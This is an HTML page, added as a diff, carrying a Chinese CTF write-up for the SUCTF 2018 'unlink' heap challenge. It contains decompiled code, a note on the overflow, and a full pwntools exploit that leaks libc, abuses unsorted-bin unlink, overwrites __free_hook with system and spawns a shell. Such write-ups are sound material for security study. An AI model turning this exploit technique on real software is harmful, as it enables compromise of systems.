@@ -1,0 +1,138 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>[SUCTF 2018 招新赛]unlink</title>
+</head>
+<body>
+<b>[SUCTF 2018 招新赛]unlink</b><br>
+<small>2025-04-21</small>
+<hr>
+<pre><code>
+unsigned __int64 delete()
+&#123;
+  int v1; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  puts(&quot;which node do you want to delete&quot;);
+  __isoc99_scanf(&quot;%d&quot;, &amp;v1);
+  if ( (&amp;buf)[v1] != 0LL &amp;&amp; v1 &gt;= 0 &amp;&amp; v1 &lt;= 9 )
+  &#123;
+    free((&amp;buf)[v1]);
+    (&amp;buf)[v1] = 0LL;
+  &#125;
+  return __readfsqword(0x28u) ^ v2;
+&#125;</code></pre>
+
+<blockquote>
+<p>Problem: <a href="https://www.nssctf.cn/problem/2334">[SUCTF 2018 招新赛]unlink</a></p>
+</blockquote>
+<p>没有UAF</p>
+<p>libc版本2.23很低 没有tcache</p>
+<pre><code>unsigned __int64 take_note()
+&#123;
+  int v1; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  puts(&quot;which one do you want modify :&quot;);
+  __isoc99_scanf(&quot;%d&quot;, &amp;v1);
+  if ( (&amp;buf)[v1] != 0LL &amp;&amp; v1 &gt;= 0 &amp;&amp; v1 &lt;= 9 )
+  &#123;
+    puts(&quot;please input the content&quot;);
+    read(0, (&amp;buf)[v1], 0x100uLL);
+  &#125;
+  return __readfsqword(0x28u) ^ v2;
+&#125;</code></pre>
+
+<p>固定写0x100存在溢出</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+#from LibcSearcher import *
+context.log_level = &#x27;debug&#x27;
+context.arch = &#x27;amd64&#x27;
+io = remote(&quot;node4.anna.nssctf.cn&quot;,28846)
+#io = process(&quot;./service&quot;)
+e = ELF(&#x27;./service&#x27;)
+libc = ELF(&#x27;/home/rick/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;)
+
+def get_addr():
+	return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))
+
+def bug():
+    attach(io)
+
+s       = lambda data               :io.send(data)
+sla      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r       = lambda num                :io.recv(num)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+itr     = lambda                    :io.interactive()
+uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))
+uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))
+ls      = lambda data               :log.success(data)
+
+def add(size):
+    sla(b&quot;chooice :&quot;,str(1))
+    sla(b&quot;size :&quot;,str(size))
+
+def delete(idx):
+    sla(b&quot;chooice :&quot;,str(2))
+    sla(b&quot;to delete&quot;,str(idx))
+
+def show(idx):
+    sla(b&quot;chooice :&quot;,str(3))
+    sla(b&quot;to show&quot;,str(idx))
+
+def edit(idx,content):
+    sla(b&quot;chooice :&quot;,str(4))
+    sla(b&quot;odify :\n&quot;,str(idx))
+    sla(b&quot;the content&quot;,content)
+
+add(0x10)
+add(0x80)
+add(0x80)#2
+add(0x80)#3
+
+bss = 0x6020c0
+
+delete(1)
+
+edit(0,b&#x27;a&#x27;*0x20)
+show(0)
+ru(b&quot;a&quot;*0x20)
+leak_libc = uu64(r(6)) - 2 - libc.sym[&quot;__realloc_hook&quot;]#gdb debug 
+offset = leak_libc + 2 + libc.sym[&quot;__realloc_hook&quot;] + 0x6e #beacuse \0a broke the fd + bk
+edit(0,b&#x27;a&#x27;*0x10+p64(0)+p64(0x91)+p64(offset)+p64(offset))
+ls(&quot;libc_base=&gt;&quot;+hex(leak_libc))
+offset_bss = bss + len(p64(0))*3
+
+payload = p64(0)+p64(0x81)+p64(offset_bss-0x20)+p64(offset_bss-0x18)+b&#x27;a&#x27;*0x60+p64(0x80)+p64(0x90)
+edit(2,payload)
+delete(3)
+#idx3 -&gt; 0x6060b8
+payload = b&#x27;a&#x27;*8+p64(leak_libc+libc.sym[&quot;__free_hook&quot;])
+
+edit(2,payload)
+#attach(io)
+payload = p64(leak_libc+libc.sym[&quot;system&quot;])
+
+edit(0,payload)
+add(0x10)
+edit(2,b&#x27;/bin/sh\x00&#x27;)
+delete(2)
+#attach(io)
+
+io.interactive()</code></pre>
+
+<p>打unsortbin unlink </p>
+<p>之前尝试打了_malloc_hook 的 one_gadget 三个打不进去 </p>
+<p>_free_hook 的 fake fastbin 一直报错 </p>
+<p>打unlink 后的 直接写got表还疯狂接收出错</p>
+<p>flag 不是直接在根目录 在~&#x2F;flag.txt</p>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
